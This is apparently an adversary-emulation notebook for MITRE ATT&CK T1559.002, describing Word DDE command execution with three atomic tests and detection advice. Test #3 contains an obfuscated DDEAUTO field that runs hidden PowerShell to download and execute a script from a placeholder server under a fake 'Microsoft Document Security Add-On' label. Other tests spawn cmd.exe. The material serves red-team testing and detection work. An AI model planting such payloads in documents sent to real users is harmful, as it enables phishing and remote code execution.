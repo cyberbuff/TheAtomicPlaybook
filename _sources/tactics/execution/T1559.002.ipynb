{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "d18df289",
   "metadata": {},
   "source": "# T1559.002 - Dynamic Data Exchange\nAdversaries may use Windows Dynamic Data Exchange (DDE) to execute arbitrary commands. DDE is a client-server protocol for one-time and/or continuous inter-process communication (IPC) between applications. Once a link is established, applications can autonomously exchange transactions consisting of strings, warm data links (notifications when a data item changes), hot data links (duplications of changes to a data item), and requests for command execution.\n\nObject Linking and Embedding (OLE), or the ability to link data between documents, was originally implemented through DDE. Despite being superseded by [Component Object Model](https://attack.mitre.org/techniques/T1559/001), DDE may be enabled in Windows 10 and most of Microsoft Office 2016 via Registry keys.(Citation: BleepingComputer DDE Disabled in Word Dec 2017)(Citation: Microsoft ADV170021 Dec 2017)(Citation: Microsoft DDE Advisory Nov 2017)\n\nMicrosoft Office documents can be poisoned with DDE commands, directly or through embedded files, and used to deliver execution via [Phishing](https://attack.mitre.org/techniques/T1566) campaigns or hosted Web content, avoiding the use of Visual Basic for Applications (VBA) macros.(Citation: SensePost PS DDE May 2016)(Citation: Kettle CSV DDE Aug 2014)(Citation: Enigma Reviving DDE Jan 2018)(Citation: SensePost MacroLess DDE Oct 2017) Similarly, adversaries may infect payloads to execute applications and/or commands on a victim device by way of embedding DDE formulas within a CSV file intended to be opened through a Windows spreadsheet program.(Citation: OWASP CSV Injection)(Citation: CSV Excel Macro Injection )\n\nDDE could also be leveraged by an adversary operating on a compromised machine who does not have direct access to a [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059). DDE execution can be invoked remotely via [Remote Services](https://attack.mitre.org/techniques/T1021) such as [Distributed Component Object Model](https://attack.mitre.org/techniques/T1021/003) (DCOM).(Citation: Fireeye Hunting COM June 2019)"
  },
  {
   "cell_type": "markdown",
   "id": "ff1d1584",
   "metadata": {},
   "source": "## Atomic Tests"
  },
  {
   "cell_type": "markdown",
   "id": "dc4a8332",
   "metadata": {},
   "source": [
    "### Atomic Test #1 - Execute Commands",
    "Executes commands via DDE using Microsfot Word\n",
    "**Supported Platforms:** windows",
    "Run it with these steps!",
    "Open Microsoft Word\n\nInsert tab -> Quick Parts -> Field\n\nChoose = (Formula) and click ok.\n\nAfter that, you should see a Field inserted in the document with an error \"!Unexpected End of Formula\", right-click the Field, and choose Toggle Field Codes.\n\nThe Field Code should now be displayed, change it to Contain the following:\n\n{DDEAUTO c:\\\\windows\\\\system32\\\\cmd.exe \"/k calc.exe\"  }\n"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "4dac593a",
   "metadata": {},
   "source": [
    "### Atomic Test #2 - Execute PowerShell script via Word DDE",
    "When the word document opens it will prompt the user to click ok on a dialogue box, then attempt to run PowerShell with DDEAUTO to download and execute a powershell script\n",
    "**Supported Platforms:** windows",
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nstart $PathToAtomicsFolder\\T1559.002\\bin\\DDE_Document.docx\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "330577ca",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1559.002 -TestNumbers 2"
  },
  {
   "cell_type": "markdown",
   "id": "5d9771ea",
   "metadata": {},
   "source": [
    "### Atomic Test #3 - DDEAUTO",
    "\nTrustedSec - Unicorn - https://github.com/trustedsec/unicorn\n\nSensePost DDEAUTO - https://sensepost.com/blog/2017/macro-less-code-exec-in-msword/\n\nWord VBA Macro\n\n[Dragon's Tail](https://github.com/redcanaryco/atomic-red-team/tree/master/ARTifacts/Adversary/Dragons_Tail)\n",
    "**Supported Platforms:** windows",
    "Run it with these steps!",
    "1. Open Word\n\n2. Insert tab -> Quick Parts -> Field\n\n3. Choose = (Formula) and click ok.\n\n4. Once the field is inserted, you should now see \"!Unexpected End of Formula\"\n\n5. Right-click the Field, choose \"Toggle Field Codes\"\n\n6. Paste in the code from Unicorn or SensePost\n\n7. Save the Word document.\n\n9. DDEAUTO c:\\\\windows\\\\system32\\\\cmd.exe \"/k calc.exe\"\n\n10. DDEAUTO \"C:\\\\Programs\\\\Microsoft\\\\Office\\\\MSWord\\\\..\\\\..\\\\..\\\\..\\\\windows\\\\system32\\\\{ QUOTE 87 105 110 100 111 119 115 80 111 119 101 114 83 104 101 108 108 }\\\\v1.0\\\\{ QUOTE 112 111 119 101 114 115 104 101 108 108 46 101 120 101 } -w 1 -nop { QUOTE 105 101 120 }(New-Object System.Net.WebClient).DownloadString('http://<server>/download.ps1'); # \" \"Microsoft Document Security Add-On\"\n"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "9c4080be",
   "metadata": {},
   "source": "## Detection\nMonitor processes for abnormal behavior indicative of DDE abuse, such as Microsoft Office applications loading DLLs and other modules not typically associated with the application or these applications spawning unusual processes (such as cmd.exe).\n\nOLE, Office Open XML, CSV, and other files can be scanned for \u2018DDEAUTO', \u2018DDE\u2019, and other strings indicative of DDE execution.(Citation: NVisio Labs DDE Detection Oct 2017)(Citation: OWASP CSV Injection)(Citation: CSV Excel Macro Injection )"
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": ".NET (PowerShell)",
   "language": "PowerShell",
   "name": ".net-powershell"
  },
  "language_info": {
   "file_extension": ".ps1",
   "mimetype": "text/x-powershell",
   "name": "PowerShell",
   "pygments_lexer": "powershell",
   "version": "7.0"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}